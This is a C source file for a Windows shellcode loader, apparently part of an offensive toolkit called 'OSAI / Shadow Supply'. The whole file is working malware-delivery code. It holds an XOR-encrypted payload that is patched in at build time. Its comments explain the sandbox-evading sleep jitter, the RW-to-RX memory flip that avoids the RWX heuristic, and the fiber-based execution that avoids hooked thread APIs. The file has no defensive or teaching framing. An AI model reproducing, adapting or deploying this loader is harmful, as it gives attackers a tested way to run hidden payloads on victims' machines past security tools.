/*
 * loader.c - native C shellcode loader for OSAI / Shadow Supply
 *
 * Different signature surface from the .NET loader:
 *   - Native x64 PE. No CLR, no AMSI, no .NET metadata.
 *   - XOR obfuscation with a fresh per-build key. No CryptoAPI calls.
 *   - Heap-buffer decryption; the on-disk .rdata blob stays encrypted.
 *     (Heap rather than stack — handles both staged ~400B and stageless
 *      ~200KB payloads without the old 16 KB stack-buffer limit.)
 *   - No RWX allocation. RW -> copy -> flip to RX.
 *   - Fiber-based execution. No CreateThread / CreateRemoteThread.
 *   - Random start jitter to burn short-run sandbox windows.
 *   - GUI subsystem (-mwindows), no console flash on execution.
 *   - Parked WinMain so the process survives if the fiber returns.
 *
 * Patched at build time by build.sh:
 *   __SC_BYTES__   comma-separated 0xNN bytes of XOR-encrypted shellcode
 *   __KEY_BYTES__  comma-separated 0xNN bytes of the XOR key
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string.h>
#include <stdlib.h>

static unsigned char SC[]  = { __SC_BYTES__ };
static unsigned char KEY[] = { __KEY_BYTES__ };
#define SC_LEN  (sizeof(SC))
#define KEY_LEN (sizeof(KEY))

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nS)
{
    (void)hI; (void)hP; (void)lpC; (void)nS;

    /* Burn short sandbox timers before doing anything suspicious. */
    srand((unsigned)GetTickCount());
    Sleep(2500 + (rand() % 4000));

    /* Decrypt into a heap buffer — no size limit, works for both staged
     * (~400 B) and stageless (~200 KB) payloads. The on-disk .rdata blob
     * stays XOR-encrypted throughout. */
    unsigned char *buf = (unsigned char *)HeapAlloc(
        GetProcessHeap(), 0, SC_LEN);
    if (!buf) return 1;
    for (size_t i = 0; i < SC_LEN; i++)
        buf[i] = SC[i] ^ KEY[i % KEY_LEN];

    /* RW allocation only; flip to RX after copy - avoids the RWX heuristic. */
    void *mem = VirtualAlloc(NULL, SC_LEN,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { HeapFree(GetProcessHeap(), 0, buf); return 1; }
    memcpy(mem, buf, SC_LEN);
    SecureZeroMemory(buf, SC_LEN);
    HeapFree(GetProcessHeap(), 0, buf);

    DWORD old;
    if (!VirtualProtect(mem, SC_LEN, PAGE_EXECUTE_READ, &old)) return 1;

    /* Fiber execution. CreateThread / CreateRemoteThread are the two most
     * hooked shellcode-launch primitives; fibers are rarely instrumented. */
    ConvertThreadToFiber(NULL);
    LPVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)mem, NULL);
    if (!scFiber) return 1;
    SwitchToFiber(scFiber);

    /* If the fiber ever returns, park the thread so WinMain does not fall
     * off the end and terminate the process before you can migrate. */
    for (;;) Sleep(0xFFFFFFFF);
    return 0;
}
